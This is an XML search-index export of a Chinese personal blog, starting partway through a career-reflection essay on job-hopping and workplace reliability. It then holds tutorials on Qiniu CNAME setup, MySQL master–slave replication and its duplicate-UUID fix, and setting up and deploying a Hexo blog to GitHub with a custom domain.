<p>项目尚未结束，连大BOSS都知道了她的存在，以后他在公司说起她来，都说：“那个很靠谱的姑娘！”</p>
<p>我却是相反的。</p>
<p>老板让我做什么，我做了，但从来不说。</p>
<p>我以为这是一种谦虚，但我不知道，在职场，你不能让别人来猜，更不能让领导来玩这个你猜你猜你猜猜猜的游戏。</p>
<p>你做了什么，说出来。</p>
<p>你遇见了什么困难，说出来。</p>
<p>我因为缺乏这种认知，一直没说。</p>
<p>这导致我遇见的80%的老板，都觉得我是一个不努力、不干活、并且没有学习力、主动性、进取心的人。</p>
<p>然后我被误解，又情绪波动。</p>
<p>一情绪波动，就辞职。</p>
<p>唉，一切都是我活该！</p>
<p>职场没有捷径。</p>
<p>如果有，也只有一条，那就是靠谱。也就是凡事有交代，件件有着落，事事有回音。</p>
<p>这不仅会让你迅速被看见，迅速成长。</p>
<p>还会让你迅速获得认可。</p>
<h2 id="04-做好现在的工作"><a href="#04-做好现在的工作" class="headerlink" title="04 做好现在的工作"></a>04 做好现在的工作</h2><p>要明白你现在的工作</p>
<p>就是你目前能力范围内最好的选择</p>
<p>相信你干一份工作前，也找了很久的工作，做了很久的选择。</p>
<p>最终选择了一个公司、企业或单位，因为这是你选择范围内最好的选择。</p>
<p>既然是最好的，就要对得起这份“最好”。</p>
<p>不说用100%的精力与努力去做好，但至少要用80%的精力去投入。</p>
<p>我没有，所以我崩了。</p>
<p>当初每进一家公司时，前三天我都会有新鲜感，到了后来，当工作开始进行高效运转时，就开始觉得：每天都是这些枯燥无味的东西，真是好烦，好无聊。</p>
<p>慢慢地就在潜意识中开始找公司的茬。</p>
<p>下午茶没有。</p>
<p>月奖金太少。</p>
<p>领导太严肃，不亲切。</p>
<p>办公室氛围不欢脱。</p>
<p>绩效考核标准太严格。</p>
<p>为什么做错事要罚钱，而不是用奖励的方式去鼓励我？</p>
<p>为什么我做得不好，领导不会用鼓励的方式来和我说？</p>
<p>我是个人，有情绪的好吗？为什么不伺候好我？为什么不来安慰我？解决我的问题？</p>
<p>然后就越来越不舒服。</p>
<p>真是好了伤疤忘了疼。</p>
<p>我忘了自己当初是如何投了几十次简历，才得到两个面试的。</p>
<p>也忘了自己当初为了找这份工作，是如何求领导：“我不要工资，我就想在这里学点东西。”</p>
<p>更忘了自己当初收到OFFER时，是如何兴奋得发朋友圈的。</p>
<p>我以自己的龟毛、任性、懒惰、狭隘，一次又一次毁了我自己最好的选择。</p>
<p>而且是主动毁掉的。</p>
<p>因为我又辞职了。</p>
<p>而且辞职的时候我一身轻松。</p>
<p>我以为，我又摆脱了一个破公司，但我没有想到的是，就在我的不理智下，我的选择慢慢变得一个不如一个。</p>
<p>最好的工作，是那家新媒体公司。</p>
<p>其次，是一家旅行公司。</p>
<p>再次，是一家做漫画的公司。</p>
<p>其他的，给我的月薪都没超过4K，而且公司越来越小，越来越杂，越来越乱。</p>
<h2 id="05-不要到处树敌"><a href="#05-不要到处树敌" class="headerlink" title="05 不要到处树敌"></a>05 不要到处树敌</h2><p>尤其不要用你的小性子，与你本该好好学习、合作的对象树敌。</p>
<p>我干过最傻的一件事，就是在朋友圈吐槽老板。</p>
<p>当然不是直接骂。而是指桑骂槐，说某些人如何如何不好，如何如何格局小。</p>
<p>结果当然被老板知道了。</p>
<p>这就成了我被辞退的一个导火索。</p>
<p>还有一次，在吃饭时，我和一个同事兴奋地八卦，说东说西，没想到几天后，这些话全传到被八卦的同事和领导耳朵里了。</p>
<p>可想而知，立即在公司树了一群敌人。</p>
<p>真的，不要搞小圈子文化。</p>
<p>不要乱发牢骚，乱发泄。</p>
<p>不要在背后说人坏话，同事的，领导的。所有这些坏话，最终都会被对方听到。</p>
<p>与人为善，永远不会错。</p>
<p>当时我骂完领导和公司后，也不觉得有什么了不起的，“我有情绪，还不能发泄啊！开除就开除呗！”</p>
<p>我以为，天下这么大，此处不留爷，自有留爷处，于是又拍屁股走人。结果，因为自己的情商过低，导致到现在，都没有从24个公司结交到一个朋友。</p>
<p>直到现在我才明白——</p>
<p>得罪的人越多，你的路会越来越窄。</p>
<p>帮助的人越多，你的路会越来越宽。</p>
<p>其实为人处世，无非就是细节上注意。</p>
<p>凡事让一步，好事多做一点，恶言恶语忍一忍，伤害他人的行为再小，也不要去做。</p>
<p>尤其是那些可能对你成长有益的、晋升有益的人，不要得罪。</p>
<p>这不仅是处世原则。</p>
<p>而是，当你在心里生了芥蒂，你就很难从他身上真正学到东西。</p>
<p>对了，分手见人品，离职也见人品。</p>
<p>离职时，做好一切交接工作，越细心越好。</p>
<p>另外就是注意，要和对你有恩的、对你帮助极大的领导与同事打个招呼，告个别。</p>
<p>不要嫌麻烦，这一步，你一定要做到。</p>
<p>我离开的24个用人单位里，最后只有那些我当初好好告别的领导没有拉黑我。</p>
<h2 id="06-感恩"><a href="#06-感恩" class="headerlink" title="06 - 感恩"></a>06 - 感恩</h2><p>我知道现在的90后非常不在乎这个。</p>
<p>觉得公司让我住五星级酒店、坐飞机、出国旅行、用心培养我，都是一种本分。</p>
<p>但问题是，公司也是需要成本的呀。</p>
<p>这些成本，他们原本也可以不用为你支付的呀。花在了你身上，他们当然会希望有所回报。</p>
<p>你回报不了业绩，也回报不了好言好语，让领导怎么想。</p>
<p>人心都是肉长的。</p>
<p>机会给谁不是给。</p>
<p>为什么非要给一个白眼狼？</p>
<p>你的态度太理所应当，领导就会想：这种人跟农夫的蛇一样，这种人对她再好也枉然，太心寒，算了。</p>
<p>于是就这样，你会错过一个个的机会，也会错过一次次的福利。</p>
<p>我做得非常不好的地方也有这个。</p>
<p>之前有一个老板非常看中我，带我去参加各种会议、行业大咖会面、发布会、明星合作，全程五星级服务，然后还带我出过国去做交流。</p>
<p>但我一直没有说过一次谢。</p>
<p>甚至还在心底想，这不是你应该做的吗？</p>
<p>结果在离职时，老板就说：“你是我见过最冷的人。”</p>
<p>我能说什么呢？</p>
<p>获得这样的评价，都是我咎由自取，怨不得别人。</p>
<p>而真正在职场风生水起的人，都是极少数内心充满感恩意识的人。</p>
<p>他们永远都明白，拥有就是得。</p>
<p>超过了本分的获得，就是恩。</p>
<p>于是会感恩这一切，并用加倍的工作来回报。</p>
<p>所以我想告诉你的最后一条就是，正因为其他人不感恩，你做到了，就非常加分，甚至变得非常出众。</p>
<p>每个人都是需要工作的。</p>
<p>不工作，会闲出毛病来，还会蚕食我们的希望和意志，你不仅会成为庸人，还会成为一个废人。</p>
<p>但既然都要工作，那就努力成为一个合格的职场人。</p>
<p>不要像我一样，因为矫情、任性、冷漠、不靠谱、无定性，把一条一条的前路，慢慢变成一条一条的绝路。</p>
]]></content>
      
        <categories>
            
            <category> 程序人生 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 跳槽 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[七牛云-如何配置域名的 CNAME]]></title>
      <url>/2019/03/09/%E4%B8%83%E7%89%9B%E4%BA%91-%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%E5%9F%9F%E5%90%8D%E7%9A%84-CNAME/</url>
      <content type="html"><![CDATA[<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>配置七牛云域名</p>
<h3 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h3><p>1：<a href="https://developer.qiniu.com/fusion/kb/1322/how-to-configure-cname-domain-name" target="_blank" rel="external">https://developer.qiniu.com/fusion/kb/1322/how-to-configure-cname-domain-name</a><br>2：<a href="http://www.bloguan.com/?id=205" target="_blank" rel="external">http://www.bloguan.com/?id=205</a></p>
<h3 id="第一步：创建域名"><a href="#第一步：创建域名" class="headerlink" title="第一步：创建域名"></a>第一步：创建域名</h3><p><img src="http://imgcdn.95dcw.com/qiniu-dns1.png" alt="image"></p>
<h3 id="第二步：配置-DNS解析"><a href="#第二步：配置-DNS解析" class="headerlink" title="第二步：配置 DNS解析"></a>第二步：配置 DNS解析</h3><h4 id="1：在七牛云“域名管理”中找到刚创建好的域名，复制它的-CNAME"><a href="#1：在七牛云“域名管理”中找到刚创建好的域名，复制它的-CNAME" class="headerlink" title="1：在七牛云“域名管理”中找到刚创建好的域名，复制它的 CNAME"></a>1：在七牛云“域名管理”中找到刚创建好的域名，复制它的 CNAME</h4><p><img src="http://imgcdn.95dcw.com/qiniu-dns2.png" alt="image"></p>
<h4 id="2-登录阿里云，找到网站的域名解析后台，找到DNS解析设置，添加CNAME记录。"><a href="#2-登录阿里云，找到网站的域名解析后台，找到DNS解析设置，添加CNAME记录。" class="headerlink" title="2:登录阿里云，找到网站的域名解析后台，找到DNS解析设置，添加CNAME记录。"></a>2:登录阿里云，找到网站的域名解析后台，找到DNS解析设置，添加CNAME记录。</h4><p><img src="http://imgcdn.95dcw.com/qiniu-dns3.png" alt="image"></p>
<h4 id="3：返回七牛云平台找到”-对象存储“，查看是否融合成功（一般要得一会）"><a href="#3：返回七牛云平台找到”-对象存储“，查看是否融合成功（一般要得一会）" class="headerlink" title="3：返回七牛云平台找到” 对象存储“，查看是否融合成功（一般要得一会）"></a>3：返回七牛云平台找到” 对象存储“，查看是否融合成功（一般要得一会）</h4><p><img src="http://imgcdn.95dcw.com/qiniu-dns4.png" alt="image"></p>
<h4 id="4：点击-内容管理-gt-上传文件，来验证是否配置成功。"><a href="#4：点击-内容管理-gt-上传文件，来验证是否配置成功。" class="headerlink" title="4：点击 内容管理-&gt;上传文件，来验证是否配置成功。"></a>4：点击 内容管理-&gt;上传文件，来验证是否配置成功。</h4><p><img src="http://imgcdn.95dcw.com/qiniu-dns5.png" alt="image"><br><img src="http://imgcdn.95dcw.com/qiniu-dns6.png" alt="image" title="图片上传成功1"><br><img src="http://imgcdn.95dcw.com/qiniu-dns7.png" alt="image" title="图片上传成功2"></p>
<h4 id="5：效果展示"><a href="#5：效果展示" class="headerlink" title="5：效果展示"></a>5：效果展示</h4><p><img src="http://imgcdn.95dcw.com/qiniu-dns8.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> Hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysql 主从复制 配置]]></title>
      <url>/2018/01/26/Mysql-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<h2 id="前期说明与准备："><a href="#前期说明与准备：" class="headerlink" title="前期说明与准备："></a>前期说明与准备：</h2><h3 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h3><div class="note primary"><p>   我用的是lnmp 集成环境，怎么搭建你到这个网站查看(<a href="http://www.lnmp.org" target="_blank" rel="external">http://www.lnmp.org</a>)<br>安装的时候注意mysql选择版本是5.7的，安装完成了以后记得使用ip在自己本地系统浏览器上看能不能正常运行</p>
</div>
<h3 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h3><div class="note primary"><p>1：准备好2台服务器，一主 一从。</p>
<pre><code>我的2台服务器：
192.168.114.100（主）
192.168.114.101（从）
</code></pre><p>2：关闭防火墙（防止意外情况）</p>
<pre><code>service iptables stop
</code></pre></div>
<h2 id="一、主数据库配置（192-168-114-100）"><a href="#一、主数据库配置（192-168-114-100）" class="headerlink" title="一、主数据库配置（192.168.114.100）"></a>一、主数据库配置（192.168.114.100）</h2><p>1：配置my.cnf 文件（ vim /etc/my.cnf ）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">server-id   = 100    //默认的为1，这个值不能重复，确保它的唯一性，一般都采用ip的后几位数</div></pre></td></tr></table></figure>
<p>2：重启mysql</p>
<pre><code>lnmp mysql restart;
</code></pre><p>3：登录主库</p>
<pre><code>mysql -uroot -p  //输入密码登录
</code></pre><p>4：查看当前主的状态</p>
<p>4.1）show master status;</p>
<p><img src="http://imgcdn.95dcw.com/msql-mt01.png" alt="image"></p>
<p>4.2）（查看mysql bin_log 二进文件，看看文件是否开启）</p>
<pre><code>ll /usr/local/mysql/var;
</code></pre><p>4.3） 重置从1开始写（当写满了之后，就会开另一个文件）</p>
<pre><code>reset master;
</code></pre><p>5：主机给从机授权</p>
<pre><code>grant replication slave on *.* to slave101@192.168.114.101 identified by &apos;123456&apos;;
</code></pre><div class="note "><p>注解：<br>允许 slave101 这个用户通过 “192.168.114.110”这个IP地址<br>访问 192.168.114.100 这台服务器的所有数据库<br>密码是 123456</p>
</div>
<p>6：查看是否创建成功<br><div class="note primary"><p>mysql&gt; use mysql;<br>mysql&gt; select user,host from user;</p>
</div></p>
<h2 id="二、从数据库配置（192-168-114-101）"><a href="#二、从数据库配置（192-168-114-101）" class="headerlink" title="二、从数据库配置（192.168.114.101）"></a>二、从数据库配置（192.168.114.101）</h2><p>1：连接从库，修改mysql配置文件 /etc/my.cnf,这部分一定要配置在[mysqld]后面</p>
<div class="note primary"><p>server-id   = 101      //默认的为1，这应是唯一值，不能重复，一般都采用ip的后几位数<br>relay_log  = mysql-relay-bin</p>
</div>
<p><img src="http://imgcdn.95dcw.com/msql-mt02.png" alt="image"></p>
<p>2：进入mysql（设置：从机监听主机）<br>1） 先关闭slave</p>
<pre><code>stop slave;
</code></pre><p>2）做同步设置（监听配置）</p>
<pre><code>change master to
master_host=&apos;192.168.114.100&apos;,
master_port=3306,
master_user=&apos;slave101&apos;,
master_password=&apos;123456&apos;,
master_log_file=&apos;mysql-bin.000001&apos;,
master_log_pos=154;
</code></pre><p>3）开启slave</p>
<pre><code>start slave;
</code></pre><p>4）查看监听状态</p>
<pre><code>show slave status\G;
</code></pre><p>5）配置成功如下图：<br><img src="http://imgcdn.95dcw.com/msql-mt03.png" alt="image"></p>
<div class="note danger"><h2 id="如有遇到：Slave-IO-Running-NO-的问题："><a href="#如有遇到：Slave-IO-Running-NO-的问题：" class="headerlink" title="如有遇到：Slave_IO_Running: NO   的问题："></a>如有遇到：Slave_IO_Running: NO   的问题：</h2><h3 id="请访问-解决mysql-主从复制，Slave-IO-Running-NO的问题"><a href="#请访问-解决mysql-主从复制，Slave-IO-Running-NO的问题" class="headerlink" title="请访问: 解决mysql 主从复制，Slave_IO_Running  NO的问题"></a>请访问: <a href="/categories/学习笔记/mysql/">解决mysql 主从复制，Slave_IO_Running  NO的问题</a></h3></div>
<hr>
<p>参考网址：<br>1：<a href="https://www.cnblogs.com/zhoujie/p/mysql1.html" target="_blank" rel="external">https://www.cnblogs.com/zhoujie/p/mysql1.html</a><br>2：<a href="http://www.cnblogs.com/DavidYan/articles/2531181.html" target="_blank" rel="external">http://www.cnblogs.com/DavidYan/articles/2531181.html</a><br>3：<a href="http://www.yii-china.com/post/detail/283.html" target="_blank" rel="external">http://www.yii-china.com/post/detail/283.html</a><br>4：<a href="http://blog.csdn.net/u010111874/article/details/52149833" target="_blank" rel="external">http://blog.csdn.net/u010111874/article/details/52149833</a>   （比较正规，可供参考）</p>
]]></content>
      
        <categories>
            
            <category> mysql </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mysql 主从复制 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解决mysql 主从复制，Slave_IO_Running  NO的问题]]></title>
      <url>/2018/01/25/%E8%A7%A3%E5%86%B3mysql-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%EF%BC%8CSlave-IO-Running-NO%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<h2 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h2><p>1：前2天做mysql 主从复制，出了 Slave_IO_Running: NO  这个错误，始终都未能配置成功，也不知道是什么原因导致的。</p>
<p>2：今天学习的时候发现了一个很 “重要且被我忽略的信息 ”：<br> Last_IO_Error: Fatal error: The slave I/O thread stops because master and slave have equal MySQL server UUIDs; these UUIDs must be different for replication to work<br>致命错误:由于主和奴隶拥有相等的MySQL服务器uuid，所以从I/O线程停止。这些uuid必须不同于复制工作。</p>
<h2 id="问题分析："><a href="#问题分析：" class="headerlink" title="问题分析："></a>问题分析：</h2><p>主、从 服务器都有相同的MySQL服务器uuid 值，这个值必须是唯一值。<br>mysql 5.6的复制引入了uuid的概念，各个复制结构中的server_uuid得保证不一样，但是查看到直接copy  data文件夹后server_uuid是相同的。</p>
<p>现在想来导致Slave_IO_Running: NO  的主要情况有两种<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">server-id 重复</div><div class="line">server_uuid 重复</div></pre></td></tr></table></figure></p>
<p>参考网址：<br>1：<a href="http://blog.csdn.net/cug_jiang126com/article/details/46846031" target="_blank" rel="external">http://blog.csdn.net/cug_jiang126com/article/details/46846031</a>  （这可以，能解决问题）<br>2：<a href="http://blog.csdn.net/shaochenshuo/article/details/49793917" target="_blank" rel="external">http://blog.csdn.net/shaochenshuo/article/details/49793917</a>   （这文章我感觉写的不太准确）</p>
<h2 id="问题解决："><a href="#问题解决：" class="headerlink" title="问题解决："></a>问题解决：</h2><p>1.登录mysql;</p>
<pre><code>mysql -uroot  -proot
</code></pre><p>2先查看UUID（主、从服务器的uuid是否一致）</p>
<pre><code>show variables like &apos;%server_uuid%&apos;;
</code></pre><p>3：修改 auto.cnf 文件(注：【Lnmp mysql】 auto.cnf 文件在  /usr/local/mysql/var)</p>
<pre><code>cd /usr/local/mysql/var
</code></pre><p>4：vim auto.cnf 文件</p>
<pre><code>把uuid 的值修改一下，确保与主服务器的uuid 不一样。
</code></pre><p>5：重启 mysql.</p>
<pre><code>lnmp mysql reload;
</code></pre><p>6：进入（登录） mysql  查看</p>
<pre><code>show slave status\G;
</code></pre>]]></content>
      
        <categories>
            
            <category> mysql </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mysql 主从复制 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql主从复制，待解决的问题]]></title>
      <url>/2018/01/23/mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%EF%BC%8C%E6%9C%AA%E8%A7%A3%E5%86%B3%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<h1 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h1><p>实现mysql 主从复制</p>
<h1 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h1><p>在百度上搜索 “ mysql 主从复制 “  就有一堆相关的文章，如下是自己到的，比较有参考价值的几个mysql 主从复制参考网址：<br>1：<a href="https://www.cnblogs.com/zhoujie/p/mysql1.html" target="_blank" rel="external">https://www.cnblogs.com/zhoujie/p/mysql1.html</a><br>2：<a href="http://www.cnblogs.com/DavidYan/articles/2531181.html" target="_blank" rel="external">http://www.cnblogs.com/DavidYan/articles/2531181.html</a><br>3：<a href="http://www.yii-china.com/post/detail/283.html" target="_blank" rel="external">http://www.yii-china.com/post/detail/283.html</a><br>4：<a href="http://blog.csdn.net/u010111874/article/details/52149833（比较正规，可供参考）" target="_blank" rel="external">http://blog.csdn.net/u010111874/article/details/52149833（比较正规，可供参考）</a></p>
<p>我是也阅读了很多相关的参考资料，不管我怎么弄，从服务器还是无法监听主服务器（是我的配置出错了，错误如下图）</p>
<p><img src="http://imgcdn.95dcw.com/12.png" alt="image"></p>
<blockquote>
<p>Slave_IO_Running: NO</p>
</blockquote>
<p>自己百度了，看的资料也不少，最终自己也去测试了，可就是不成功，自己现在无法解决这个问题，这让我有些迷茫~</p>
<p>现在也只能将问题都记录下来，以后的自己一定能把这个问题解决的。</p>
<h1 id="诊断-分析）："><a href="#诊断-分析）：" class="headerlink" title="诊断(分析）："></a>诊断(分析）：</h1><p>1：没有ping通（主服务器地址没有ping通从服务器，或者说从服务器没有ping通 主服务器）</p>
<p>2：同步的文件，与位置不一致</p>
<h1 id="方案："><a href="#方案：" class="headerlink" title="方案："></a>方案：</h1><p>暂无….</p>
]]></content>
      
        <categories>
            
            <category> mysql </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[next主题站内搜索]]></title>
      <url>/2017/04/04/hexo-%E7%AB%99%E5%86%85%E6%90%9C%E7%B4%A2/</url>
      <content type="html"><![CDATA[<blockquote>
<p>就作一个站内搜索，不用插件 algolia 来做搜索功能</p>
</blockquote>
<p>先看这俩篇文章：</p>
<p><a href="https://material.viosey.com/services/#搜索系统" target="_blank" rel="external">https://material.viosey.com/services/#搜索系统</a></p>
<p><a href="https://github.com/PaicHyperionDev/hexo-generator-search" target="_blank" rel="external">https://github.com/PaicHyperionDev/hexo-generator-search</a></p>
<p>1.安装：</p>
<pre><code>npm install hexo-generator-search --save
</code></pre><p>2.站点配置 _config.yml</p>
<pre><code>search:
  path: search.xml
  field: all
</code></pre><p>3.打开主题配置文件，搜索search将enable 改为true 就可以了。</p>
<pre><code>local_search:
 enable: false
</code></pre><p>4.效果展示<br>  <img src="/images/article/xiaogo.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> Hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
            <tag> search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexo 域名绑定]]></title>
      <url>/2017/04/03/Hexo%20%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/</url>
      <content type="html"><![CDATA[<p>很是好奇，Hexo 是怎么绑定域名的，自己也从网上弄来不资料，看了看好像也就那么回事。<br>并没有想象中的那么难，于是就动手把它给开出来了。</p>
<p>多的步骤不多说，直接上阿里云，添加解析，先看图在看文字，这样节省时间。<br><img src="http://imgcdn.95dcw.com/%E8%A7%A3%E6%9E%90.png" alt="image"></p>
<p>记录类型选A或CNAME，A记录的记录值就是ip地址，github(官方文档)提供了两个IP地址，192.30.252.153和192.30.252.154，这两个IP地址为github的服务器地址<br>两个都要填上，解析记录设置两个www 和@，线路就默认就行了，CNAME记录值填你的github博客网址。</p>
<p>注：</p>
<blockquote>
<p>CNAME  这个我记录的是Hexo 并不是www ，因为www 另有用处，这反倒还可以让你更明白，并非一定要解析www 。</p>
</blockquote>
<p>在根目录新建一个文件，如下如所示，不要后缀名。<br><img src="http://imgcdn.95dcw.com/%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6.png" alt="image"></p>
<p>至于里面写什么，我也不多说了直接上图<br><img src="http://imgcdn.95dcw.com/%E5%86%99%E5%85%A5%E5%9F%9F%E5%90%8D.png" alt="image"></p>
<p>95dcw.com 这是我注册的域名</p>
<p>OK 这就完成了</p>
<p>敲几个命令，不用多说你也知道这是干什么的吧。<br>hexo clean<br>hexo g<br>hexo d</p>
<p>hexo.95dcw.com 效果展示<br><img src="http://imgcdn.95dcw.com/%E6%95%88%E6%9E%9C%E5%B1%95%E7%A4%BA.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> Hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
            <tag> Github </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo  简单操作]]></title>
      <url>/2017/04/03/hexo%20%20%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/</url>
      <content type="html"><![CDATA[<p>我也不知道hexo这东西怎么用来着，还不熟悉不管怎么样吧，我今天晚上都要把这个搭建出来。<br>我要做到如下几点：<br>1：new 一个新的页面，并且可以做到连接跳转<br> 如: PHP日记/    当我点击php日记的时候，能显示所有的文章</p>
<p>2：把站内搜索给做出来</p>
<p>3：把github中的域名给解析了，在阿里云中解析出来。</p>
<h3 id="下面是一些常用的命令"><a href="#下面是一些常用的命令" class="headerlink" title="下面是一些常用的命令"></a>下面是一些常用的命令</h3><p>hexo new “postName”         #新建文章<br>hexo new page “pageName”    #新建页面<br>hexo generate                 #生成静态页面至public目录<br>hexo server                    #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy                 #将.deploy目录部署到GitHub</p>
<p>常用复合命令：<br>hexo deploy -g<br>hexo server -g</p>
<p>简写：<br>hexo n == hexo new<br>hexo g == hexo generate<br>hexo s == hexo server<br>hexo d == hexo deploy</p>
<p>平常就四步<br>1：建一个新的文章<br>2：生成静态页面<br>3：预览效果<br>4：部署至GitHub</p>
]]></content>
      
        <categories>
            
            <category> Hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 基本操作命令 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo + github搭建博客]]></title>
      <url>/2017/04/01/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<hr>
<p>参考网址：</p>
<ol>
<li><a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" rel="external">http://ibruce.info/2013/11/22/hexo-your-blog/</a></li>
<li><a href="http://www.jianshu.com/p/465830080ea9" target="_blank" rel="external">http://www.jianshu.com/p/465830080ea9</a> </li>
</ol>
<blockquote>
<p>请参考网址的两篇文章在本起搭建起hexo项目并正常的运行，我重点放在如何配置上。</p>
</blockquote>
<p>第1个参考文章，基本都可以解决一大半问题，用不到30分钟就将安装步骤什么的做完。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">要解决的问题：</div><div class="line">怎么将本地hexo项目上传到github中，要做些什么配置。</div><div class="line">怎么配置与绑定域名</div></pre></td></tr></table></figure>
<h2 id="第一步：在github创建项目"><a href="#第一步：在github创建项目" class="headerlink" title="第一步：在github创建项目"></a>第一步：在github创建项目</h2><p>别的我不多说了直接上图<br><img src="http://imgcdn.95dcw.com/hexoGithub01.png" alt="image"></p>
<h2 id="第二步：配置config"><a href="#第二步：配置config" class="headerlink" title="第二步：配置config"></a>第二步：配置config</h2><p>1：打开你本地搭建好的hexo项目，在根目录下打开_config.yml这个文件，翻到最下面，配置成我这样子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">deploy:</div><div class="line">     type: git</div><div class="line">     repo: git@github.com:yang958554999/yang958554999.github.io.git</div><div class="line">     branch: master</div></pre></td></tr></table></figure>
<p>对上面的解释：<br>type: 有的type是github, 还有的type是repository，貌似hexo3.0后全部改成我上面这种格式了。<br>repo: 这个用的是你自己Github上的地址看下图<br>branch: 采用的分支，默认的都是用主分支</p>
<p><img src="http://imgcdn.95dcw.com/hexoGithub02.png" alt="image" title="repo"><br>2：安装 hexo-deployer-git</p>
<blockquote>
<p>npm install hexo-deployer-git –save</p>
</blockquote>
<p>3：执行命令<br>hexo d 将网站（文件）部署到Github上</p>
<h2 id="第三步：绑定域名"><a href="#第三步：绑定域名" class="headerlink" title="第三步：绑定域名"></a>第三步：绑定域名</h2><p>如何绑定域名，请看这篇文章 <a href="http://hexo.95dcw.com/2017/04/03/Hexo%20%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/" target="_blank" rel="external">点击链接</a></p>
]]></content>
      
        <categories>
            
            <category> Hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
  
  
    
    <entry>
      <title></title>
      <url>/categories/index.html</url>
      <content type="html"></content>
    </entry>
    
    <entry>
      <title></title>
      <url>/tags/index.html</url>
      <content type="html"></content>
    </entry>
    
  
</search>
